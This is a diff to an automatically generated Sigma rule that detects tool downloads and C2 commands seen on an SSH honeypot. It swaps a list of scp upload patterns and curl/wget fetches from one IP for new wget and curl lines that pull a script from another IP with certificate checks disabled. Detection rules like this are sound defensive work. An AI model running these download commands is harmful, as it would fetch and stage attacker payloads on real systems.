@@ -2,10 +2,10 @@ title: Honeypot - SSH Tool Download/C2
 id: fd95910a-efe3-a7c5-fcfd-5c41dda23e91
 status: experimental
 level: critical
-description: Tool download or C2 related commands from SSH honeypot. 33 events, 3
-  source IPs, 15 unique patterns.
+description: Tool download or C2 related commands from SSH honeypot. 2 events, 1 source
+  IPs, 2 unique patterns.
 author: LLM Honeypot Intelligence Platform (automated)
-date: 2026/05/22
+date: 2026/06/10
 references:
 - https://attack.mitre.org/
 tags:
@@ -17,21 +17,8 @@ logsource:
 detection:
   selection:
     CommandLine|contains:
-    - scp -t /bin/k4hpytt9p9vk4tst6uuygjcnjz
-    - scp -qt "/dev/shm/kDSAADoJ
-    - scp -qt "/dev/shm/achaUNAT
-    - scp -t /usr/bin/k4hpytt9p9vk4tst6uuygjcnjz
-    - scp -qt "/dev/shm/uYkJtZaN
-    - scp -qt "/dev/shm/DTURvuPq
-    - scp -qt "/dev/shm/NfUJZBuw
-    - scp -qt "/dev/shm/ZsveeUXA
-    - curl ipinfo.io/org
-    - scp -t ~/k4hpytt9p9vk4tst6uuygjcnjz
-    - scp -t /dev/shm/k4hpytt9p9vk4tst6uuygjcnjz
-    - curl -O http://180.129.130.18/amd
-    - scp -qt "/dev/shm/fjLaBUQT
-    - wget http://180.129.130.18/syss
-    - scp -qt "/dev/shm/BaZAkxlp
+    - wget --no-check-certificate -qO- https://80.27.83.195/sh
+    - curl -sk https://80.27.83.195/sh
   condition: selection
 falsepositives:
 - Legitimate system administration
